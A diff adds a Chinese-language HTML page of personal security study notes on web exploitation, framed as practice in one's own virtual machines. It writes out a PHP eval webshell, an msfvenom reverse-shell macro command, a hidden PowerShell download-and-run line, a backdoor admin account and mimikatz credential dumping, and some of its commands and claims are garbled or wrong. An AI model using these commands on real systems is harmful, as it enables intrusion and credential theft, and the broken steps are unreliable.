@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>第7章 web安全漏洞 | 网络安全宝典</title>
+  <link rel="stylesheet" href="/Jyc_035030.github.io/css/style.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+  <style>
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif;
+  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+  min-height: 100vh;
+  padding: 20px;
+  line-height: 1.8;
+}
+.container {
+  max-width: 900px;
+  margin: 0 auto;
+  background: white;
+  border-radius: 20px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  overflow: hidden;
+}
+.header {
+  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+  color: white;
+  padding: 40px 30px;
+  text-align: center;
+  position: relative;
+}
+.header::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 200%;
+  height: 200%;
+  background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 70%);
+}
+.header-content { position: relative; z-index: 1; }
+.chapter-badge {
+  display: inline-block;
+  background: rgba(102,126,234,0.9);
+  padding: 8px 20px;
+  border-radius: 20px;
+  font-size: 14px;
+  font-weight: 600;
+  margin-bottom: 15px;
+  letter-spacing: 1px;
+}
+.page-title {
+  font-size: 32px;
+  font-weight: 700;
+  margin-bottom: 10px;
+}
+.page-subtitle {
+  opacity: 0.85;
+  font-size: 16px;
+}
+.nav-bar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 15px 30px;
+  background: #f8f9fa;
+  border-bottom: 1px solid #e9ecef;
+}
+.nav-link {
+  color: #667eea;
+  text-decoration: none;
+  font-weight: 500;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  transition: color 0.3s;
+}
+.nav-link:hover { color: #764ba2; }
+.content {
+  padding: 40px 35px;
+}
+.chapter-title {
+  font-size: 28px;
+  color: #1a1a2e;
+  margin-bottom: 30px;
+  padding-bottom: 15px;
+  border-bottom: 3px solid #667eea;
+  display: inline-block;
+}
+.section-title {
+  font-size: 20px;
+  color: #16213e;
+  margin: 25px 0 15px 0;
+  padding-left: 15px;
+  border-left: 4px solid #667eea;
+  font-weight: 600;
+}
+.content-p {
+  margin: 12px 0;
+  color: #333;
+  font-size: 15px;
+  text-align: justify;
+}
+.content-link {
+  color: #667eea;
+  word-break: break-all;
+  text-decoration: none;
+  border-bottom: 1px dashed #667eea;
+  transition: all 0.3s;
+}
+.content-link:hover {
+  color: #764ba2;
+  border-bottom-style: solid;
+}
+.content-hr {
+  border: none;
+  height: 2px;
+  background: linear-gradient(90deg, transparent, #e9ecef, transparent);
+  margin: 20px 0;
+}
+.content-quote {
+  background: #f8f9fa;
+  border-left: 4px solid #667eea;
+  padding: 12px 18px;
+  margin: 15px 0;
+  color: #555;
+  font-style: italic;
+  border-radius: 0 8px 8px 0;
+}
+.tip-text {
+  background: linear-gradient(135deg, #fff3cd, #ffeeba);
+  padding: 10px 15px;
+  border-radius: 8px;
+  display: block;
+  margin: 15px 0;
+  color: #856404;
+  font-weight: 500;
+}
+.note-text {
+  color: #6c757d;
+  font-size: 14px;
+  background: #f1f3f5;
+  padding: 2px 8px;
+  border-radius: 4px;
+}
+.arrow-text {
+  color: #764ba2;
+  font-weight: 500;
+  margin: 10px 0;
+  padding-left: 10px;
+}
+.image-placeholder {
+  background: linear-gradient(135deg, #e9ecef, #dee2e6);
+  border: 2px dashed #adb5bd;
+  border-radius: 12px;
+  padding: 30px;
+  text-align: center;
+  margin: 20px 0;
+  color: #6c757d;
+}
+.image-placeholder i {
+  font-size: 48px;
+  color: #adb5bd;
+  margin-bottom: 10px;
+}
+.image-placeholder p {
+  margin: 0;
+  font-size: 14px;
+}
+.footer {
+  text-align: center;
+  padding: 20px;
+  background: #f8f9fa;
+  color: #6c757d;
+  font-size: 13px;
+  border-top: 1px solid #e9ecef;
+}
+@media (max-width: 768px) {
+  body { padding: 10px; }
+  .header { padding: 30px 20px; }
+  .page-title { font-size: 24px; }
+  .content { padding: 25px 20px; }
+  .nav-bar { padding: 12px 20px; flex-wrap: wrap; gap: 10px; }
+}
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <div class="header-content">
+        <div class="chapter-badge">网络安全宝典 · 第7章</div>
+        <h1 class="page-title">web安全漏洞</h1>
+        <p class="page-subtitle">原创笔记 · 一字不差</p>
+      </div>
+    </div>
+    
+    <div class="nav-bar">
+      <a href="main.html" class="nav-link"><i class="fa fa-list-ul"></i> 目录</a>
+      <a href="index.html" class="nav-link"><i class="fa fa-home"></i> 返回首页</a>
+    </div>
+    
+    <div class="content">
+      <h1 class="chapter-title">第七章 web安全漏洞 </h1>
+<h3 class="section-title">1. web安全漏洞的分类和利用</h3>
+<p class="content-p">&gt; 漏洞利用 是渗透测试的第二阶段，目的就是为了 远程控制对方的电脑。</p>
+<p class="content-p">&gt; WEB渗透通常来说就是找网站的相关漏洞，然后通过漏洞给服务器植木马从而控制电脑，</p>
+<p class="content-p">当然还有其他的漏洞就是通过漏洞可以对网站的业务产生影响。</p>
+<p class="content-p">&gt; Web安全学习的主要就是漏洞利用，然而漏洞非常多，学明白 高手最低4个月（有些人做网络安全3年了，依然在弄这个漏洞）</p>
+<p class="content-p">&gt; 我们要学明白的常见的漏洞有：</p>
+<h3 class="section-title">2. webshell的工作原理：</h3>
+<p class="content-p">&gt; Webshell是一种以网页文件形式存在的恶意脚本(比如说 后缀为.php的文件)，攻击者把它上传到服务器上，之后就能通过浏览器远程控制这台服务器。</p>
+<p class="content-p">&gt; 说白了webshell就是木马的一种，属于网站的木马。 它的攻击范围仅限于该网站及其数据库，但它是黑客从外网突破进入内网最重要的“敲门砖”。</p>
+<p class="content-p"></p>
+<p class="content-p">&gt; 之所以叫webshell，就是为了专业一点。我们可以说：通过webshell来控制别人的网站。</p>
+<p class="content-p">&gt; 想要控制一个网站，必须通过漏洞将木马上传的网站的服务器中、然后使用工具进行连接木马，从而实现远程控制网站</p>
+<p class="content-p">以下是对一些名词的解释：</p>
+<p class="content-p">-漏洞：网站因为设计的原因存在漏洞</p>
+<p class="content-p">-木马：网页木马简称Web shell</p>
+<p class="content-p">-工具：冰蝎、哥斯拉、蚁剑、菜刀（这些工具就是和木马连接的，当木马植入到对方电脑中时，我们可以利用这些工具来控制对方的电脑）</p>
+<h3 class="section-title">3. 冰蝎、哥斯拉、蚁剑网站是如何被控制的？</h3>
+<p class="content-p">&gt; 通过漏洞将木马上传到服务器</p>
+<p class="content-p">黑客电脑————(通过漏洞上传木马)————到网站服务器</p>
+<p class="content-p">我们可以把自己的电脑 模拟成黑客电脑，把虚拟机 模拟成网站服务器，来练习。</p>
+<p class="content-p">----</p>
+<p class="content-p">&gt; 软件下载</p>
+<p class="content-p">冰蝎、哥斯拉、蚁剑 都已经完成下载安装</p>
+<p class="content-p">蚁剑可以直接双击”加速器”打开，冰蝎、哥斯拉打开方式 特殊且相似。</p>
+<h3 class="section-title">4. 实战利用漏洞控制服务器</h3>
+<p class="content-p">确定网站——找该网站存在的漏洞（博客，网站，报告什么的，直接去网上搜索，有的靶场/软件自带漏洞，如Yakit、自己搭建的练习网站）</p>
+<p class="content-p">第一步</p>
+<p class="content-p">主机用phpstudy搭建网站phpmyadmin.com——VMware虚拟机win10，访问该网站——登录进去，熟悉一下。（这样其实不太行，应该让虚拟机自己搭建网站，而不是访问主机的）</p>
+<p class="content-p">第二步</p>
+<p class="content-p">&gt; GetShell 是网络安全领域的一个行话，简单来说就是：通过利用漏洞，在目标服务器上获得一个可以执行命令的“控制入口”。</p>
+<p class="content-p">&gt; GetShell 是非法入侵的核心环节。未经授权对任何服务器进行 GetShell 操作，都属于违法犯罪行为（违反《刑法》第285条）。请务必只在你自己的、完全可控的测试环境（如本地虚拟机）中学习相关知识。</p>
+<p class="content-p">&gt; WebShell 是 GetShell 最常用的一种形式。它本质上就是一个木马后门文件，比如 shell.php 可以理解为：getshell是一个操作/过程的结果，webshell是一个文件或工具。</p>
+<p class="content-p">----</p>
+<p class="content-p">&gt; Php My admin Get Shell的方式有很多，我们今天讲一种，通过日志get shell，原理如下：</p>
+<p class="content-p">general_log默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p>
+<p class="content-p">可以尝试自定义日志文件，并向日志文件里面写入内容的话，那么就可以成功get shell：</p>
+<p class="content-p">----</p>
+<p class="content-p">在win10虚拟机里面访问phpmyadmin网站（自己用宝塔搭建，不访问主机的），登录进去点击上面的SQL，输入SHOW VARIABLES LIKE 'general%' ，可以查看记录（该网站在电脑中的存放位置），刚开始是处于关闭状态的，黑客走的时候需要把记录清楚了。</p>
+<p class="content-p">第三步 打开记录</p>
+<p class="content-p">在同样的sql页面执行命令show variables like 'general_log'; 打开日志</p>
+<p class="content-p">可以通过show variables like 'general_log'; 判断是否打开成功</p>
+<p class="content-p">打开后，NO后，接下来的一切操作就会被记录在日志文件里面去</p>
+<p class="content-p">第四步 自定义一个日志路径，放在网站的目录下，网站目录在首页已经显示</p>
+<p class="content-p"></p>
+<p class="content-p">&gt; 就是把general_log_file的路径改一下，改成我们可以访问的路径（我们不能通过浏览器的http/https协议，来访问受害者电脑的C盘或D盘等）把这个东西改到网站的目录中去，我们可以通过浏览器访问网站来 获取/修改 信息。</p>
+<p class="content-p">&gt; x-prober探针，直接访问网站即可</p>
+<span class="tip-text">&lt;a href="https://prober.inn-studio.com" target="_blank" class="content-link"&gt;</span>https://prober.inn-studio.com<span class="tip-text">&lt;/a&gt;</span>
+<p class="content-p">这个探针（X-Prober）的核心作用，就是帮你快速、直观地看清楚一台服务器的"底细"。简单来说，它像一个服务器体检工具。</p>
+<p class="content-p">探针本身就是一个PHP脚本，探针在哪，就能访问哪台电脑的信息。黑客可以把探针注入到受害者的电脑里面，获取信息。但是探针本身是合法的工具。</p>
+<p class="content-p">Webshell==木马，但是探针不是Webshell，也不是木马。</p>
+<p class="content-p">探针一定要在测试环境使用，并且用完后必须立即删除，因为它确实可能成为攻击者获取服务器信息的关键入口。当然黑客也可以在受害者的电脑里使用。</p>
+<p class="content-p">第五步 传木马</p>
+<p class="content-p">-木马可能只是一个简单的txt文件（里面写了一串代码、命令、字符串等，如selct’&lt;?php eval($_POST[1]);?&gt;’;  该字符串中1就是木马密码），文件本身不重要，里面的代码才重要。</p>
+<p class="content-p">-攻击者，将木马文件传到受害者机器（或受害者机器的网站中），然后通过冰蝎、哥斯拉、蚁剑等工具(攻击者电脑上的) 来获取受害者电脑信息和控制对方的电脑。</p>
+<p class="content-p">-注意 冰蝎、哥斯拉、蚁剑 这些工具不是用来上传木马的，上传木马的方法大概有：</p>
+<h3 class="section-title">1. 最基础：通过 Web 漏洞上传（必学）</h3>
+<p class="content-p">这是实习面试必问的点。在 Win10 虚拟机里搭建一个存在漏洞的网站（比如 Upload-labs 靶场或 DVWA）。</p>
+<p class="content-p">操作逻辑：利用后端未过滤 Content-Type 或后缀名，通过 Burp Suite 抓包，将 shell.php 后缀改成 shell.jpg 或 shell.php.png 绕过检测，然后上传。</p>
+<p class="content-p">目的：重点学习绕过姿势（前端 JS 绕过、MIME 绕过、%00 截断），面试官最爱问这个。</p>
+<h3 class="section-title">2. 最猥琐：通过 Office 宏病毒（钓鱼实战）</h3>
+<p class="content-p">如果 Win10 虚拟机是“员工机”，而你模拟“外网突破”。</p>
+<p class="content-p">操作逻辑：用 msfvenom 生成一个包含木马的 VBA 宏代码，把它嵌入 Word 或 Excel 文档里。然后你在主机假装发邮件，诱导虚拟机里的“员工”双击打开。</p>
+<p class="content-p">命令示例：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=你主机IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f vba-exe &gt; evil.txt</p>
+<p class="content-p">目的：学习免杀初体验和社工思维，大厂实习很看重攻击链路完整性。</p>
+<h3 class="section-title">3. 最直接：通过 SMB 共享或远程桌面（内网横向）</h3>
+<p class="content-p">既然都是内网同网段，可以直接利用系统特性。</p>
+<p class="content-p">操作逻辑：在主机用 net use 命令尝试连接虚拟机的默认共享（C$），如果虚拟机的管理员账户密码太弱（比如 admin/123456），你就可以直接把木马 exe 复制过去。</p>
+<p class="content-p">命令：copy shell.exe \\192.168.x.x\C$\Windows\Temp\</p>
+<p class="content-p">目的：学习内网密码爆破和哈希传递的基础，这是中大型公司红队必做的。</p>
+<h3 class="section-title">4. 最经典：通过 Powershell 远程加载（无文件落地）</h3>
+<p class="content-p">现在企业防护严，上传 exe 容易被杀。</p>
+<p class="content-p">操作逻辑：主机起一个简易 HTTP 服务（python -m http.server 80），然后在 Win10 虚拟机里跑一条命令：powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('<span class="tip-text">&lt;a href="http://主机IP/payload.ps1')" target="_blank" class="content-link"&gt;</span>http://主机IP/payload.ps1')<span class="tip-text">&lt;/a&gt;</span></p>
+<p class="content-p">目的：理解“非落地攻击”和“内存执行”，写在简历里会显得你技术比较新。</p>
+<p class="content-p">第六步 如何使用中国蚁剑</p>
+<p class="content-p">打开蚁剑(加速器)——空白处右键，选择添加数据——只需要填写前两行（木马的地址 木马的密码）——点击测试连接(注意右下角提示)——测试成功后，直接点击添加按钮——左键双击刚刚添加的链接——进入到控制页面(可以看到对方电脑的C盘/D盘/...里面的各自文件数据)——右键选中的文件，可以对指定文件做各种操作——回到蚁剑首页，右键刚刚添加的链接，点击虚拟终端（该操作相当于，可以查看使用对方电脑的cmd，如ipcongfig、whoami、hostname、guanji等各种黑客操作）</p>
+<p class="content-p"></p>
+<p class="content-p">第七步 开启3389实现远程控制</p>
+<p class="content-p">&gt; 上一步是使用工具中国蚁剑 在虚拟终端中，需要输入命令来控制对方电脑（太吃技术、太麻烦、太浪费时间）</p>
+<p class="content-p">&gt; 木马已经写入到了文件中，接下来就是通过工具连接木马就可以实现远程控制对方的电脑，查看3389开放情况netstat -ano （3389 是 Windows 远程桌面（RDP）的默认端口）</p>
+<p class="content-p">-在虚拟终端里面，输入netstat -ano，可以查看受害者电脑的3389端口是否开放。</p>
+<p class="content-p">-如果没有开启，在虚拟终端里面输入下面的命令，可以一键开启3389端口</p>
+<p class="content-p">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal""Sever /v fDeny TS Connections</p>
+<p class="content-p">/t REG_DWORD /d 00000000 /f</p>
+<p class="content-p">-此时再去查看，即可发现3389端口开放</p>
+<p class="content-p">-此时在虚拟终端里面，执行下面的命令，可以打开受害者电脑的远程桌面连接，当然可能会受到防火墙的拦截</p>
+<p class="content-p">net user hacker 123456!@#ABC /add</p>
+<p class="content-p">net localgroup administrators hacker /add</p>
+<p class="content-p">- 打开后，输入攻击者电脑的IP地址(就是自己电脑)——输入对方电脑的密码——然后就可以直接远程控制受害者的电脑了</p>
+<p class="content-p">- 这个时候，需要用到工具mimikatz.exe（下载到工具者电脑上，专门查看受害者密码的），在中国蚁剑虚拟终端里面执行命令mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"，来获取对方电脑的密码。</p>
+<p class="content-p">-在打开的 mimikatz.exe 窗口中，依次输入以下三条命令（每输完一条按一次回车）：</p>
+<p class="content-p">privilege::debug、sekurlsa::logonPasswords、exit</p>
+<p class="content-p">每次打开都需要输入这三条命令。</p>
+<h3 class="section-title">5. 宝塔面板使用攻略</h3>
+<p class="content-p">我在win10虚拟机里面用”宝塔面板”，主机用的是phpstudy。使用前一定要做好基础设置(面板设置、服务器IP、域名、绑定目录等)。</p>
+    </div>
+    
+    <div class="footer">
+      <p>📝 网络安全宝典 · 原创笔记 | 我的博客</p>
+    </div>
+  </div>
+</body>
+</html>
